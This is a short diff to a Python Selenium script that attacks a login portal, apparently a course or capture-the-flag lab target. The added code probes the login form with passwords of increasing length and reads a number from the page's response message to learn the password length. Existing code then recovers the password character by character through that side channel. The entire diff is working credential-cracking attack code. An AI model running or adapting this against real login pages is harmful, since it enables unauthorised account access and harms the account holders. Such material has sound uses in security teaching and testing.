@@ -19,7 +19,7 @@ def find_number_in_string(input_string):
     return number_found
 
 
-def password_finder(input_username, password_length):
+def password_finder(input_username):
     driver = webdriver.Chrome()
 
     driver.get('https://portal.regjeringen.uiaikt.no/')  # digkala login page
@@ -37,6 +37,20 @@ def password_finder(input_username, password_length):
     filler_password = ""  # Will decrease as correct characters are found, appended on correct_password
     total_time = len(correct_password) + 1
 
+    password_length = 1
+    while True:
+        password_to_check = "a" * password_length
+        password_field.clear()
+        password_field.send_keys(password_to_check)
+        login_button.click()
+        time.sleep(0.2)
+        time_check = find_number_in_string(driver.find_element(By.ID, "responseMessage").text)
+        if time_check > 0:
+            print("Password length: " + str(password_length))
+            break
+        password_length += 1
+
+    print("Finding password:")
     for i in range(password_length-total_time):
         filler_password += "a"
 
